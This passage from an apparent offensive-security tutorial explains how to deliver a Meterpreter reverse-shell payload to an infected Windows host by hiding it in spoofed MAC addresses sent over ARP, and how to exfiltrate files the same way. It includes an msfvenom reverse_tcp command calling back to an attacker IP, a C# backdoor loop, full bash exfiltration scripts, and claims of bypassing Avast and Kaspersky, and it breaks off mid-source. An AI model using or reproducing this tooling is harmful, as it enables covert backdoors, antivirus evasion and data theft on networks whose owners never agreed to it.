Ipaddress is 192.168.1.5\n\r\n\rNow you can compare picture 3 with picture 4 so this is your ARP traffic in this Technique for Transferring Payloads by ARP Traffic.\n\r\n\r\n\r•Note : (Arpspoof , etthercap ) tools in linux , if you want you can use these tools but I think your traffic with Arpspoof will  detect by some AVs and firewalls , but I think with my method the risk of detection in the network or in the target infected system by AV or firewalls is very low.  \n\r\n\r\n\r•Note : MAC Duplicate is another Problem , and maybe happen in this technique so by that technique in picture 6 you can decrease this risk .  \n\r\n\r\n\rNow I want to say where is our problem in this Technique? \n\r\n\rPicture 5:\n\r\n\rSo Now we have these payloads after our response :\n\r\n\r{ fc4883e4f0 + 000c4dabc000 + e8cc000000 + 4151415052 } == fc4883e4f0000c4dabc000e8cc0000004151415052\n\r\n\rAs you can see in picture 5 we have Red Mac-Address and our Payload now is incorrect.\n\r\n\rSo how can fix this problem?\n\r\n\rAs you can see in picture 6 I have idea about that.  \n\r\n\rPicture 6:\n\r\n\rYou can change your Payload patterns from two sections to three sections\n\r\n\r00{payload} ===&gt; 00{payload}00f0\n\r\n\rNow you can check new section in your backdoor code when you received one MAC Address without Section three your code should drop that MAC Address. Because that is unknown Response so this is not valid Injected Payload.\n\r\n\rNow we can start this attack with my tools, but first you should make payloads:\n\r\n\rIn kali linux you can make payload with msfvenom . Kali linux ip-adrees is 192.168.1.50.\n\r\n\r\n\rmsfvenom –arch x86_64 –platform windows –p windows/x64/meterpreter/reverse_tcp lhsot=192.168.1.50 –f c &gt; /root/desktop/payload.txt  \n\r\n\r\n\rNow you should copy this payload.txt from linux to windows system (Macchanger system) with IPadress 192.168.1.5 by new file with this format like picture 7 \n\r\n\rPicture 7: Payload.txt\n\r\n\rPayload_to_Mac.exe tool:\n\r\n\rAt this time you should use the payload in picture 7 with this tool like picture 8 , so you can copy this payload from payload.txt then paste that after switch \"null\" for Payload_to_Mac.exe .\n\r\n\rsyntax: Payload_to_Mac.exe null payload\n\r\n\rNote: this application needs to run as administrator for changing the MAC Address \n\r\n\ryou can see all syntax for this tool after execute that without switch:\n\r\n\r Picture 8 : Payload_to_Mac.exe Tool \n\r\n\rAnd in this picture you can see I used Switch null + PAYLOAD string. \n\r\n\rPicture 8-1: Switch null + payload\n\r\n\rNow you should copy all lines and paste to one BAT file for example Macchanger.BAT like picture 9. Remember you should Run as Administrator this BAT file too. In this step you should add in the first line like picture 9 this MacAddress , this MAC Address is the flag for starting the ARP traffic in my code, so you should add this line manually and save that. \n\r\n\rPicture 9: Bat file with New Line .\n\r\n\r \n\r\n\rNow in this step you should add New line in the last line of this File again like picture 10 . \n\r\n\rPicture 10: Bat file with new line.\n\r\n\rThis mac address is flag for Finishing ARP traffic.\n\r\n\rNow in this step you should check these properties in your Network Adapter and your registry Regkey_Parent : for changing your mac address on Win7 you need to find this registry address in your windows by this path:\n\r\n\r\"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\\"\n\r\n\rAfter checking this path you should find your Parent_Regkey in this case for my windows this parent_key is 0007 As you can see in picture 11, in 0007 I found my NIC “Driver Desc”\n\r\n\rDriver Desc = Intel® PRO/1000 MT Network\n\r\n\rAnd you can see my Network Connection “Local Area Connection” properties is same with this Regkey Both are “Intel® PRO/1000 MT Network” so my correct Parent_REGKEY is 0007. and this is not same for all windows so maybe in your Windows this number is different . Finally i should change all “Connection Name” from “Local Network Connection” to “Local Area Connection” In my BAT file line by line.\n\r\n\r\n\rNote: remember “Local Area Connection” IP-ADDRESS is “static = 192.168.1.5“ \n\r\n\r\n\rYou should use static IP-Address in this case 192.168.1.5 , in picture 11 you can see these properties depend on your windows setting \n\r\n\rPicture 11: Bat file and Parent_Regkey and Connection Name.\n\r\n\rNote: if your setting in the BAT file was not matched by your registry and your NIC Name, this tool will not change your Mac Address.\n\r\n\rNow my setting for Payload_to_mac.exe (Macchnager) is complete but you should use this tool after executing NativePayload_ARP.exe tool on the infected system, this is really important for this technique, first run NativePayload_ARP.exe in (backdoor system) tool then you can Run Payload_to_Mac.exe tool in (macchanger system).\n\r\n\rNow you should use NativePayload_ARP.exe to transferring the Meterpreter Payload‍ with the ARP traffic and execute that in infected system memory.\n\r\n\rNativePayload_ARP.exe tool step by step:\n\r\n\rStep 1: You can use this tool like picture 12 without arguments:\n\r\n\rAfter running this tool you can type IPAddress for sending ARP traffic to this IPaddress (macchanger system) in this case 192.168.1.5 and press enter.\n\r\n\rnow you should type your local IPAddress for sending ARP request by this IP-Address and press enter.\n\r\n\rin this case local IP-Address is 192.168.1.113 , this is IP-Address for (backdoor system) .\n\r\n\rNote : infected system (backdoor system) IPaddress is (192.168.1.113) and my backdoor (NativePayload_ARP.exe) Executed in this IPaddress like picture 12.Picture 12: NativePayload_ARP (backdoor) tool \n\r\n\rFinally after 38 minutes Meterpreter session Established like picture 13:Picture 13: NativePayload_ARP tool and transfer Backdoor Payload by ARP Traffic \n\r\n\rI have best of the best Anti-viruses in the world, this stupid Avast bypassed without encryption method “Again”.\n\r\n\ras you can see in Picture 14 Kaspersky bypassed by this technique .Picture 14: AV bypassed \n\r\n\rRelated video 1 : https://youtu.be/qDLicXj7Vuk\n\r\n\rImportant Points : for “NativePayload_ARP” C# Code this section of code is very important so I want to talk about these lines step by step :\n\r\n\r \n\r\n\r            string temp_arps = \"\";\n\r\n\r            string temp_arps_2 = \"\";\n\r\n\r            byte[] mac = new byte[6];\n\r\n\r            byte[] temp_mac = new byte[6];\n\r\n\r            int maclen = 0;\n\r\n\r            bool init = false;\n\r\n\r            int init_countdown = 0;\n\r\n\r            List&lt;string&gt; MacAddress = new List&lt;string&gt;();\n\r\n\r            try\n\r\n\r            {\n\r\n\r                while (true)\n\r\n\r                {\n\r\n\r                    maclen = mac.Length;\n\r\n\r \n\r\n\r                    int _mac = SendArp(ConvertIPToInt32(IPAddress.Parse(Target_IPaddress_ARP_Request)), ConvertIPToInt32(IPAddress.Parse(local_IPaddress_ARP_Request)), mac, ref maclen);\n\r\n\r \n\r\n\r                    System.Threading.Thread.Sleep(1000);               \n\r\n\r \n\r\n\r                    if (_mac == 0)\n\r\n\r                    {\n\r\n\r                        temp_arps = \"\";\n\r\n\r                        temp_arps_2 = \"\";\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                        Console.Write(\"Found   \" + \" : \");\n\r\n\r                        string srt_ip = Target_IPaddress_ARP_Request;\n\r\n\r                        Console.Write(\"Get Mac ==&gt; \" + srt_ip + \" MacAddress : \");\n\r\n\r                        foreach (byte item in mac)\n\r\n\r                        {\n\r\n\r                            if ((Convert.ToInt32(mac[0]) != 0))\n\r\n\r                            {\n\r\n\r                                /// if first section of MAC address != 00 then show that by Red Color\n\r\n\r                                /// this code added for macchanger in linux when this tool sent Unknown Mac to Backdoor system\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                            }\n\r\n\r                            else if ((Convert.ToInt32(mac[0]) == 0))\n\r\n\r                            {\n\r\n\r                                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                            }\n\r\n\r                            Console.Write(item.ToString(\"x2\") + \" \");\n\r\n\r                            temp_arps += item.ToString(\"x2\");\n\r\n\r                            temp_arps_2 += item.ToString(\"x2\");\n\r\n\r                        }\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Arps += temp_arps.Remove(0, 2);\n\r\n\r                        string tmp = temp_arps.Remove(0, 2);\n\r\n\r                        if (MacAddress.Count == 0 &amp;&amp; tmp.ToString() != \"ffffffffff\" &amp;&amp; tmp.ToString() != \"ff00ff00ff\" &amp;&amp; init &amp;&amp; temp_arps_2.ToString().Substring(0, 2) == \"00\")\n\r\n\r                        {\n\r\n\r                            MacAddress.Add(tmp);\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                            Console.WriteLine(\"[\" + init_countdown.ToString() + \"] Dumping Bytes: \" + MacAddress.AsEnumerable().AsQueryable().Last().ToString());\n\r\n\r                        }\n\r\n\r                        else\n\r\n\r                        {\n\r\n\r                            /// time to exit and execute Payload ;-/\n\r\n\r                            if (tmp.ToString() == \"ffffffffff\" &amp;&amp; init) { break; }\n\r\n\r                            //if (Arps.ToString() == \"ffffffffff\") { break; }\n\r\n\r \n\r\n\r                            /// time to strat and dump Payload ;-/\n\r\n\r                            if (temp_arps_2.ToString() == \"00ff00ff00ff\") { init = true; init_countdown++; }\n\r\n\r \n\r\n\r                            if (init)\n\r\n\r                            {\n\r\n\r                                if (MacAddress.Capacity != 0 &amp;&amp; MacAddress.AsEnumerable().Last().ToString() != tmp &amp;&amp; init_countdown &gt; 1 &amp;&amp; temp_arps_2.ToString().Substring(0, 2) == \"00\")\n\r\n\r                                {\n\r\n\r                                    MacAddress.Add(tmp);\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                    Console.WriteLine(\"[\" + init_countdown.ToString() + \"] Dumping Bytes: \" + MacAddress.AsEnumerable().AsQueryable().Last().ToString());\n\r\n\r                                }\n\r\n\r                                init_countdown++;\n\r\n\r                            }\n\r\n\r                        }\n\r\n\r                    }\n\r\n\r                    else if (_mac == 67)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r                        Console.Write(\"NotFound\" + \" : \");\n\r\n\r                        string srt_ip = Target_IPaddress_ARP_Request;\n\r\n\r                        Console.Write(\"Get Mac ==&gt; \" + srt_ip + \" MacAddress : \");\n\r\n\r                        foreach (byte item in mac)\n\r\n\r                        {\n\r\n\r                            Console.Write(item.ToString(\"x2\") + \" \");\n\r\n\r                        }\n\r\n\r                        Console.WriteLine();\n\r\n\r                    }\n\r\n\r                    temp_mac = mac;\n\r\n\r                    System.Threading.Thread.Sleep(4000);\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r            catch (Exception e2)\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine(\"error 2: {0}\", e2.Message);\n\r\n\r            }\n\r\n\r \n\r\n\r \n\r\n\rwith this code you will send ARP Request via Local Network Adapter local_Ipaddress_ARP_Request for finding MAC Address for Target System or MacChanger system  Target_Ipaddress_ARP_Request.\n\r\n\rCode 1:\n\r\n\r                    int _mac = SendArp(ConvertIPToInt32(IPAddress.Parse(Target_IPaddress_ARP_Request)), ConvertIPToInt32(IPAddress.Parse(local_IPaddress_ARP_Request)), mac, ref maclen);\n\r\n\r \n\r\n\rwith this code you will have Flag to Start Dump or “Init = true” so when your ARP Response was equal to Mac-Address \"00ff00ff00ff\" then your Code will start to dump Next Mac-Address as Payloads in this case Meterpreter Payload.\n\r\n\rCode 2:\n\r\n\r                            /// time to strat and dump Payload ;-/\n\r\n\r                            if (temp_arps_2.ToString() == \"00ff00ff00ff\") { init = true; init_countdown++; }\n\r\n\r \n\r\n\rthis code Will Execute only Once , why Because we have something like this if (MacAddress.Count == 0  so by this Code only you will get First Mac-Address After Flag to Start  or (Init=True)\n\r\n\rCode 3:\n\r\n\r if (MacAddress.Count == 0 &amp;&amp; tmp.ToString() != \"ffffffffff\" &amp;&amp; tmp.ToString() != \"ff00ff00ff\" &amp;&amp; init &amp;&amp; temp_arps_2.ToString().Substring(0, 2) == \"00\")\n\r\n\r                        {\n\r\n\r                            MacAddress.Add(tmp);\n\r\n\r                            Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                            Console.WriteLine(\"[\" + init_countdown.ToString() + \"] Dumping Bytes: \" + MacAddress.AsEnumerable().AsQueryable().Last().ToString());\n\r\n\r                        }\n\r\n\r \n\r\n\rthis code Made for Time to Exit from Loop and Executing Payloads so this is Flag to Finish when your Mac-Address Response is equal to \"ffffffffff\".\n\r\n\rCode 4:\n\r\n\r                             /// time to exit and execute Payload ;-/\n\r\n\r                            if (tmp.ToString() == \"ffffffffff\" &amp;&amp; init) { break; }\n\r\n\r \n\r\n\rthis is “important point” for this code with this section of code you will get every Mac-Addresses if your “init” Flag was true so by this code you will dump all Mac-Address or “Meterpreter Payloads” except “First Payload or Mac-Address” and this code MacAddress.AsEnumerable().Last().ToString() != tmp was for Detecting “Double Mac-Address” also for Sure your “Last” Mac-Address was not Equal to “New” Mac-Address.\n\r\n\rCode 5:\n\r\n\r                         if (init)\n\r\n\r                            {\n\r\n\r                                if (MacAddress.Capacity != 0 &amp;&amp; MacAddress.AsEnumerable().Last().ToString() != tmp &amp;&amp; init_countdown &gt; 1 &amp;&amp; temp_arps_2.ToString().Substring(0, 2) == \"00\")\n\r\n\r                                {\n\r\n\r                                    MacAddress.Add(tmp);\n\r\n\r                                    Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                                    Console.WriteLine(\"[\" + init_countdown.ToString() + \"] Dumping Bytes: \" + MacAddress.AsEnumerable().AsQueryable().Last().ToString());\n\r\n\r                                }\n\r\n\r                                init_countdown++;\n\r\n\r                            }\n\r\n\r \n\r\n\rNow we should talk about Payload_to_Mac.exe Tool  and C# Code for this one , first of all because I talked about how can use this tool in this time I just want to talk about New Switch “LIN” in this tool , for windows System we have Switch “NULL” and for making Script in Linux Systems we have new Switch called : “LIN”.\n\r\n\rSo by this Switch you can have something like “Picture 15” to making “Script” and with this Script your Mac-Changer system will be Linux System .\n\r\n\r \n\r\n\rSyntax : Switch “LIN”\n\r\n\rStep I  syntax 0 : c:\\&gt; Payload_to_Mac.exe lin\n\r\n\rStep I  syntax 1 (Linux) : c:\\&gt; Payload_to_Mac.exe lin \"PAYLOAD\" \n\r\n\rStep I  Example 1: c:\\&gt; Payload_to_Mac.exe lin \"5fffd583f8007d2858415759680040\" \n\r\n\ras can see in “Picture 15” with this Switch you will have “Bash-Script Lines” and in this Simple code I used “Ifconfig” , “macchanger” and “Sleep” commands for creating and changing your LINUX system Mac-Address as “Macchanger system”.\n\r\n\r Picture 15: Switch “lin” \n\r\n\r\n\r\n\ralso in next Picture you can see I used this Script File “Demo.sh” on Macchanger system in this case “Kali Linux” via this command : Root@kali# ./demo.sh | grep New\n\r\n\r \n\r\n\rstep 1: (Windows side “PC-A , 192.168.56.103” ) , Using something like “Picture 15” and copy this lines to “demo.sh” file\n\r\n\rstep 2: (Windows side “PC-A , 192.168.56.103” ) , Executing NativePayload_ARP.exe like “Picture 17”\n\r\n\rstep 3: (Linux side “PC-B , 192.168.56.102 or Macchangr system ” ) ,  ./demo.sh | grep New\n\r\n\rstep 4: (Attacker Side second Linux system “PC-C , 192.168.56.1” ) , Meterpreter Session is ready\n\r\n\r  \n\r\n\rPicture 16: NativePayload_ARP.exe and Meterpreter Session\n\r\n\r  \n\r\n\rPicture 17: NativePayload_ARP.exe and Demo.sh File.\n\r\n\r \n\r\n\r \n\r\n\rLinux systems and Transferring DATA/Payload via ARP Traffic (PART1)\n\r\n\rin this time I want to talk about Linux without using “C# Code” for this method so in this case we have 2 Linux systems for Transferring or DATA Exfiltration via ARP Traffic so in this PART1 I will talk about Script Code and in Next PART2 in this chapter I will talk about Using These Script Code via Simple Script “NativePayload_ARP.sh”.\n\r\n\r \n\r\n\rExfiltration meaning : how you can Upload/Download DATA from one system to another systems via ARP Traffic\" , it is not talk about how you can Transfer DATA from LAN to WAN \"Exfiltration\" , at least in my opinion in this picture.\n\r\n\r  \n\r\n\rPicture 18: Exfiltration/Transfer DATA via ARP traffic‍ from IPAddress 56.101 to 56.1 (Step by Step)\n\r\n\r Picture 19: using this Method with two scripts (Ops.sh and Exfiltration_via_ARP.sh) \n\r\n\rUsing this method with Scripts step by step :\n\r\n\rFirst of all in this method you should have “static” IPv4 Address for “MacChanger” system .\n\r\n\rAs you can see with this “echo” command and “xxd” we can have something like this , in this case I used “-c 5” for chunking  String by “5 bytes”.\n\r\n\rroot@kali:~# echo \"Exfiltration via ARP traffic.\" | xxd -c 5\n\r\n\r0000000: 4578 6669 6c  Exfil\n\r\n\r0000005: 7472 6174 69  trati\n\r\n\r000000a: 6f6e 2076 69  on vi\n\r\n\r000000f: 6120 4152 50  a ARP\n\r\n\r0000014: 2074 7261 66   traf\n\r\n\r0000019: 6669 632e 0a  fic..\n\r\n\r \n\r\n\rnow you can imagine this 45 78 66 69 6c + 00 will be one New Mac Address , how ? \n\r\n\rYou can see in “step 0” we will have “NEW” Mac Address .\n\r\n\r \n\r\n\rStep 0: 4578 6669 6c  Exfil   == &gt; 00 + 45:78:66:69:6c == Mac Address ==&gt;  00:45:78:66:69:6c\n\r\n\rStep 1: sudo ifconfig eth0 down; sudo macchanger -m  00:45:78:66:69:6c  eth0; sudo ifconfig eth0 up; sleep 2;\n\r\n\r \n\r\n\ras you can see in “step 1” we can have this Mac Address with Macchnager Command for changing our MAC Address to New “Fake MAC Address” very simply.\n\r\n\r \n\r\n\rStep 2: 7472 6174 69  trati   == &gt; 00 + 74:72:61:74:69 == Mac Address ==&gt;  00:74:72:61:74:69\n\r\n\rStep 3: sudo ifconfig eth0 down; sudo macchanger -m  00:74:72:61:74:69  eth0; sudo ifconfig eth0 up; sleep 2;\n\r\n\r \n\r\n\ryou can compare this method via Scripts on Linux with Pictures “3 and 4” on Windows .\n\r\n\rSo in “Picture 19” you can see how this Script “Exfiltration_via_ARP.sh” worked .\n\r\n\rCode : Exfiltration_via_ARP.sh \n\r\n\r #!/bin/sh\n\r\n\recho \" #!/bin/sh\"\n\r\n\rfor ops in `xxd -p -c 5 $1 | sed \'s/../&amp;:/g\'`; \n\r\n\r do\n\r\n\r   Exfil=`echo $ops | sed \'s/:$/ /\'`\n\r\n\r   text=`echo $Exfil | xxd -r -p`\n\r\n\r   echo \"#Injecting text: \" \\\"$text\\\" to Mac via Address 00:$Exfil   \n\r\n\r   echo \"sudo ifconfig eth0 down; sudo macchanger -m \" 00:$Exfil  \" eth0; sudo ifconfig eth0 up; sleep 2;\"\n\r\n\r   echo  \n\r\n\r done\n\r\n\r \n\r\n\rin this step we have something like these Commands like “Picture 19“.\n\r\n\rNote : “demo.txt” is our text file for Exfiltration via ARP traffic to another system.\n\r\n\r \n\r\n\rSteps for System with IPv4 Address : 192.168.56.101\n\r\n\rCommands Step1: ./Exfiltration_via.sh demo.txt &gt; MacChanger.sh\n\r\n\rCommands Step2: chmod 775 MacChanger.sh\n\r\n\rCommands Step3-1: ./MacChanger.sh | grep New\n\r\n\rSteps for System with IPv4 Address : 192.168.56.1\n\r\n\rCommands Step3-2: arping 192.168.56.101 -W 2 -c 11 &gt; Data.txt\n\r\n\rCommands Step4: ./ops.sh Data.txt\n\r\n\rNote : Steps 3-1 and 3-2 should be at same time .\n\r\n\r \n\r\n\rStep 3-2 : in this step you can get MAC Addresses via ARP traffic by arping command.\n\r\n\rStep 4 : in this step with Ops.sh you can translate these Mac-Addresses from Data.txt file , “Bytes” to “string”.\n\r\n\r \n\r\n\rCode : Ops.sh \n\r\n\r #!/bin/sh\n\r\n\r t=`awk {\'print $4\'} $1`\n\r\n\r # debug\n\r\n\r # echo $t\n\r\n\r  for ops in `echo $t | xxd -p`; \n\r\n\r        do\n\r\n\r        ops1=`echo $ops | xxd -r -p`\n\r\n\r        ops2=`echo $ops | xxd -r -p | xxd -r -p`\n\r\n\r        echo $ops1 \"==&gt;\" $ops2\n\r\n\r        done\n\r\n\r   echo\n\r\n\r   echo \"[;)] your Injected Bytes via Mac Addresses: \"\n\r\n\r   echo `echo $t`\n\r\n\r   echo\n\r\n\r   echo \"[;o] your Data : \"\n\r\n\r   echo\n\r\n\r   echo $t | xxd -r -p\n\r\n\rScripts Source Code : https://github.com/DamonMohammadbagher/NativePayload_ARP/tree/master/EBOOK\n\r\n\r \n\r\n\rLinux systems and Transferring DATA/Payload via ARP Traffic (PART2)\n\r\n\rin this “Part2” I want to show you how can do this method by Simple Script “NativePayload_ARP.sh”. in this script I used codes from “Part1” (Exfiltration_via_ARP.sh &amp; ops.sh) so we have these code on Simple Script by “NativePayload_ARP.sh”\n\r\n\r \n\r\n\rUsing NativePayload_ARP.sh Step by step :\n\r\n\r \n\r\n\rStep1 (Client Side) :  in this step you can use switch “-s” for Injecting Text (Bytes) to Network Adapter “MAC Address“ so your syntax in this step is : \n\r\n\r \n\r\n\r \n\r\n\rsyntax : “NativePayload_ARP.sh -s text-file.txt eth0 delay x”\n\r\n\rexample : “NativePayload_ARP.sh -s 1.txt eth0 delay 3”\n\r\n\r Picture 20: \n\r\n\rStep2 (Server Side) :  in this step you can get these Bytes from “Client Side” by Arp Scanning via Network-adapter “vboxnet0” so for doing this I used Arping tool (Sending arp request for 192.168.56.101 via Vboxnet0 ) , in this step your syntax is :\n\r\n\r \n\r\n\rsyntax : “NativePayload_ARP.sh -a vboxnet0 Target-IPv4 “\n\r\n\rexample : “NativePayload_ARP.sh -a vboxnet0 192.168.56.101“\n\r\n\r Picture 21: \n\r\n\ras you can see in these “Pictures 20 &amp; 21” , Bytes for text file “1.txt” transferred from client to Server by ARP Traffic (after 36 Seconds). \n\r\n\r \n\r\n\rat a glance :  as you can see we can use MAC Address as Payload also we can use ARP traffic for DATA Exfiltration in LAN also with this method you can make one bridge between Virtual Machine to Physical Machine (using vboxnet0 interface) and “detecting this method by Firewalls and AVS is difficult”.\n\r\n\r \n\r\n\rNativePayload_ARP.sh\n\r\n\r #!/bin/sh\n\r\n\recho\n\r\n\recho \"NativePayload_ARP.sh , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting/Downloading/Uploading DATA via ARP Traffic\"\n\r\n\recho \"help syntax: ./NativePayload_ARP.sh help\"\n\r\n\recho\n\r\n\r \n\r\n\rif [ $1 == \"help\" ]\n\r\n\rthen\n\r\n\rtput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"Example Step1: (Client Side ) ./NativePayload_ARP.sh -s text-file eth0 delay x\"\n\r\n\r        echo \"Example Step2: (Server Side ) ./NativePayload_ARP.sh -a vboxnet target-IPv4 \"\n\r\n\r        echo \"example IPv4:192.168.56.101 : ./NativePayload_ARP.sh -s mytext.txt eth0 delay 3\"\n\r\n\r        echo \"example IPv4:192.168.56.1 : ./NativePayload_ARP.sh -a vboxnet 192.168.56.101 \"\n\r\n\r        echo \"Description: with Step1 you will inject Data to MAC address for eth0 , with Step2 you can have this text file via Scanning target-system by ARP traffic (Using Arping tool)\"\n\r\n\r        echo\n\r\n\r        \n\r\n\rfi\n\r\n\r# ./NativePayload_ARP.sh -s mytext.txt eth0 delay 3\n\r\n\rif [ $1 == \"-s\" ]\n\r\n\rthen\n\r\n\r                echo \"[!] Changing MAC Address via macchanger Tool\"\n\r\n\r                counter=0 \n\r\n\r                Defdelay=3\n\r\n\r                if [ $4 == \"delay\" ] \n\r\n\r                        then\n\r\n\r                        Defdelay=$5\n\r\n\r                        elif [ -z \"$4\" ]\n\r\n\r                        then\n\r\n\r                        Defdelay=3\n\r\n\r                fi\n\r\n\r        # start flag\n\r\n\r        Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r        echo \"[&gt;] [$Time] Changing MAC Address to start ... (Delay 5 sec)\"\n\r\n\r        sudo ifconfig $3 down; sudo macchanger -m  00:ff:ff:ff:ff:ff $3 | grep New; sudo ifconfig $3 up; sleep 5;\n\r\n\r        echo\n\r\n\r \n\r\n\r        for ops in `xxd -p -c 5 $2 | sed \'s/../&amp;:/g\' `; \n\r\n\r        do\n\r\n\r                Exfil=$ops\n\r\n\r                Exfil=`echo $Exfil `                \n\r\n\r                if (( `echo ${#Exfil}` == 15 ))\n\r\n\r                then \n\r\n\r                tput setaf 7;        \n\r\n\r                echo \"[!] your text is:\" `echo $Exfil | xxd -r -p `\n\r\n\r                tput setaf 6;        \n\r\n\r                echo \"[!] your MAC Address is:\" 00:\"${Exfil::-1}\"\n\r\n\r                #echo \"sudo ifconfig eth0 down; sudo macchanger -m \" 00:\"${Exfil::-1}\" \" eth0; sudo ifconfig eth0 up; sleep x;\"\n\r\n\r                tput setaf 9;\n\r\n\r                Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r                echo \"[&gt;] [$counter] [$Time] MAC Changing Done , Delay is :\" $Defdelay \"(sec)\"        \n\r\n\r                sudo ifconfig $3 down;sudo macchanger -m  00:\"${Exfil::-1}\" $3 | grep New; sudo ifconfig $3 up; sleep $Defdelay;\n\r\n\r                ((counter++))\n\r\n\r                echo ------------------\n\r\n\r                fi                \n\r\n\r        done\n\r\n\r                # finish flag\n\r\n\r                echo\n\r\n\r                Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r                echo \"[&gt;] [$Time] Changing MAC Address to (finish flag)\"\n\r\n\r                sudo ifconfig $3 down; sudo macchanger -m  00:ff:00:ff:00:ff $3 | grep New; sudo ifconfig $3 up; sleep $Defdelay;\n\r\n\r                echo\n\r\n\r \n\r\n\rfi\n\r\n\r \n\r\n\r#./NativePayload_ARP.sh -a eth0 192.168.56.101 \n\r\n\r \n\r\n\rif [ $1 == \"-a\" ]\n\r\n\rthen\n\r\n\r        # this ARPData.txt file tested by Arping version: \"arping utility, iputils-s20161105\" and \"kali linux 2018.2\"\n\r\n\r        # some arping switches changed by old/new versions\n\r\n\r        arping -I $2 $3 -w 0 -b &gt; ARPData.txt &amp;\n\r\n\r        init=0\n\r\n\r        Time=`date \'+%d/%m/%Y %H:%M:%S\'`\n\r\n\r        echo \"[!] [$Time] Scanning Target [$3] via Arping by delay (1 sec).\"\n\r\n\r        while true; do\n\r\n\r        String=`cat ARPData.txt | grep -e 00:ff:00:ff:00:ff -e 00:FF:00:FF:00:FF`\n\r\n\r        #printf \'\\u2591\\n\'\n\r\n\r        #printf \'\\u2592\\n\'\n\r\n\r        #printf \'\\u2593\\n\'\n\r\n\r        if (( init == 0 ))\n\r\n\r        then\n\r\n\r        Startflag=`cat ARPData.txt | grep -e 00:ff:ff:ff:ff:ff -e 00:FF:FF:FF:FF:FF`\n\r\n\r                if (( `echo ${#Startflag}` !=0 ))\n\r\n\r                then\n\r\n\r                tput setaf 6;\n\r\n\r                Time=`date \'+%d/%m/%Y %H:%M:%S\'`        \n\r\n\r                echo \"[!] [$Time] Start flag MAC Address Detected :\" 00:ff:ff:ff:ff:ff\n\r\n\r                ((init++))\n\r\n\r                fi        \n\r\n\r        fi                                \n\r\n\r \n\r\n\r                if (( `echo ${#String}` !=0 ))\n\r\n\r                then\n\r\n\r                killall arping\n\r\n\r                tput setaf 6;\n\r\n\r                Time=`date \'+%d/%m/%Y %H:%M:%S\'`        \n\r\n\r                echo \"[!] [$Time] Finish flag MAC Address Detected :\" 00:ff:00:ff:00:ff\n\r\n\r                break\n\r\n\r                fi\n\r\n\r        sleep 1\n\r\n\r        done\n\r\n\r        ###\n\r\n\r        LastMacAddress=\"\"\n\r\n\r        FinalPayload=\"\"\n\r\n\r        # this ARPData.txt file tested by Arping version: \"arping utility, iputils-s20161105\"\n\r\n\r        # some arping switches changed by old/new versions\n\r\n\r        # ARPData.txt , Dumping MAC : xx:xx:xx:xx:xx:xx\n\r\n\r        # Unicast reply from 192.168.56.101 [xx:xx:xx:xx:xx:xx]  0.864ms\n\r\n\r        # Unicast reply from 192.168.56.101 [00:FF:FF:FF:FF:FF]  0.864ms\n\r\n\r        # Unicast reply from 192.168.56.101 [00:74:68:69:73:20]  1.012ms\n\r\n\r        for MacAddresses in `cat ARPData.txt | grep Unicast | awk {\'print $5\'} | sed \'s/\\[/ /g\' | sed \'s/\\]/ /g\'`; \n\r\n\r        do\n\r\n\r                # echo $MacAddresses\n\r\n\r                # echo $LastMacAddress\n\r\n\r                # echo\n\r\n\r                if [[ `echo $MacAddresses` != `echo $LastMacAddress` ]]\n\r\n\r                then\n\r\n\r                        FinalPayload+=`echo $MacAddresses`:\n\r\n\r                        #echo \"Debug\"\n\r\n\r                fi\n\r\n\r        LastMacAddress=$MacAddresses\n\r\n\r        done\n\r\n\r        tput setaf 7;        \n\r\n\r        echo\n\r\n\r        echo \"[!] Your Injected Bytes via Mac Addresses: \"\n\r\n\r        echo $FinalPayload\n\r\n\r        echo\n\r\n\r        tput setaf 6;\n\r\n\r        Time=`date \'+%d/%m/%Y %H:%M:%S\'`        \n\r\n\r        echo \"[!] [$Time] Your Data : \"\n\r\n\r        echo\n\r\n\r        echo \"${FinalPayload:17:-17}\" | xxd -r -p\n\r\n\r        echo\n\r\n\r        echo\n\r\n\r \n\r\n\rfi\n\r\n\r \n\r\n\rGithub C# : https://github.com/DamonMohammadbagher/NativePayload_ARP\n\r\n\rNativePayload_ARP.cs\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Text;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Net;\n\r\n\rusing System.Reflection;\n\r\n\rusing System.Runtime.CompilerServices;\n\r\n\r \n\r\n\rnamespace NativePayload_ARP\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r        private static Int32 ConvertIPToInt32(IPAddress pIPAddr)\n\r\n\r        {\n\r\n\r            byte[] lByteAddress = pIPAddr.GetAddressBytes();\n\r\n\r            return BitConverter.ToInt32(lByteAddress, 0);\n\r\n\r        }\n\r\n\r \n\r\n\r        [DllImport(\"Iphlpapi.dll\", EntryPoint = \"SendARP\")]\n\r\n\r        internal extern static Int32 SendArp(Int32 destIpAddress, Int32 srcIpAddress, byte[] macAddress, ref Int32 macAddressLength);\n\r\n\r \n\r\n\r        // public static string[] ARP_Payload;\n\r\n\r        public static string Arps = \"\";\n\r\n\r \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r \n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"NativePayload_ARP v1.0 Tool : Transfer Backdoor Payload by ARP 